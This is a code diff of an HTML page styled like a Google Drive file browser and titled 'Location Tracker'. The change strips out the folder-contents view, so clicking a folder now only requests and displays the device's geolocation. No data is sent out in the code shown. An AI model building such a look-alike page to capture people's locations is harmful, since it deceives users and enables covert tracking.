@@ -4,7 +4,48 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>My Drive — Location Tracker</title>
-<link rel="stylesheet" href="style.css">
+<style>
+* {box-sizing:border-box;}
+body {margin:0; font-family:Arial,sans-serif; background:#f8fafd; color:#202124;}
+.topbar {height:70px; background:white; border-bottom:1px solid #dadce0; display:flex; align-items:center; padding:0 25px; gap:30px;}
+.logo {display:flex; align-items:center; gap:10px; font-size:23px; white-space:nowrap;}
+.logo-icon {font-size:30px;}
+.search {background:#edf2fa; border-radius:25px; padding:12px 18px; width:50%; max-width:600px;}
+.search input {border:none; outline:none; background:transparent; width:100%; font-size:15px;}
+.avatar {margin-left:auto; background:#4285f4; color:white; width:40px; height:40px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; cursor:pointer;}
+.layout {display:flex; min-height:calc(100vh - 70px);}
+.sidebar {width:230px; padding:20px 12px;}
+.new-button-container {position:relative;}
+.new-button {background:white; border:1px solid #dadce0; border-radius:15px; padding:14px 25px; font-size:15px; cursor:pointer; margin-bottom:25px; width:100%; text-align:left;}
+.new-button:hover {background:#f1f3f4;}
+.new-dropdown {display:none; position:absolute; top:100%; left:0; background:white; border:1px solid #dadce0; border-radius:8px; margin-top:5px; min-width:180px; box-shadow:0 2px 8px rgba(0,0,0,0.1); z-index:10;}
+.new-dropdown.show {display:block;}
+.new-dropdown-item {padding:10px 15px; cursor:pointer;}
+.new-dropdown-item:hover {background:#f1f3f4;}
+.nav-item {padding:13px 18px; border-radius:25px; margin-bottom:5px; cursor:pointer;}
+.nav-item:hover {background:#edf2fa;}
+.nav-item.active {background:#d3e3fd;}
+.main {flex:1; padding:30px;}
+.heading {display:flex; justify-content:space-between; align-items:center;}
+.heading h2 {margin-top:0;}
+.folder-grid {display:grid; grid-template-columns:repeat(auto-fill, minmax(190px,1fr)); gap:16px; margin-top:20px;}
+.folder {background:white; border:1px solid #dadce0; border-radius:12px; padding:20px; cursor:pointer; transition:all 0.15s;}
+.folder:hover {background:#f1f6ff; transform:translateY(-2px);}
+.folder-icon {font-size:35px;}
+.folder-name {margin-top:15px; font-size:16px; font-weight:500;}
+.folder-page {display:none;}
+.back-button {background:#d3e3fd; border:none; border-radius:20px; padding:10px 18px; cursor:pointer; margin-bottom:20px; font-size:14px;}
+.back-button:hover {background:#b9d4fa;}
+@media (max-width:700px) {
+    .topbar {padding:0 10px; gap:10px;}
+    .logo span {display:none;}
+    .search {width:65%;}
+    .sidebar {width:90px; padding:15px 5px;}
+    .nav-item {font-size:11px; padding:12px 5px; text-align:center;}
+    .new-button {padding:12px 5px;}
+    .main {padding:18px;}
+}
+</style>
 </head>
 <body>
 
@@ -68,16 +109,10 @@
             <div class="folder-name">Ex</div>
         </div>
     </div>
-</div>
 
-<div id="folderPage" class="folder-page">
-    <button class="back-button" onclick="goHome()">← Back to Drive</button>
-    <h2 id="folderTitle">📁 Folder</h2>
-    <div id="folderContents"></div>
-    
     <div id="locBox" style="margin-top:25px; padding:18px; background:#eef5ff; border-radius:10px; display:none; border:1px solid #d3e3fd;">
-        <strong>📍 Device Location</strong><br><br>
-        Folder: <span id="whichFolder" style="font-weight:bold;"></span><br>
+        <strong>📍 Device Location Captured</strong><br><br>
+        Folder selected: <span id="whichFolder" style="font-weight:bold;"></span><br>
         Latitude: <span id="gotLat" style="font-family:monospace; color:#1a73e8;"></span><br>
         Longitude: <span id="gotLng" style="font-family:monospace; color:#1a73e8;"></span><br>
         Accuracy: <span id="gotAcc"></span> meters<br>
@@ -114,15 +149,6 @@ function handleFolderClick(folderName) {
             const accuracy = position.coords.accuracy;
             const time = new Date().toLocaleString();
 
-            document.getElementById("homePage").style.display = "none";
-            document.getElementById("folderPage").style.display = "block";
-            document.getElementById("folderTitle").textContent = "📁 " + folderName;
-
-            const files = folderContents[folderName] || [];
-            document.getElementById("folderContents").innerHTML = files.length
-                ? `<ul style="list-style:none; padding:0;">${files.map(f => `<li style="padding:10px 0; border-bottom:1px solid #eee;">📄 ${f}</li>`).join('')}</ul>`
-                : '<p>This folder is empty.</p>';
-
             document.getElementById('locBox').style.display = 'block';
             document.getElementById('whichFolder').textContent = folderName;
             document.getElementById('gotLat').textContent = lat.toFixed(6);
@@ -153,12 +179,6 @@ function handleFolderClick(folderName) {
             maximumAge: 0
         }
     );
-}
-
-function goHome() {
-    document.getElementById("folderPage").style.display = "none";
-    document.getElementById("homePage").style.display = "block";
-    document.getElementById('locBox').style.display = 'none';
 }
 
 document.getElementById('searchInput').addEventListener('input', e => {
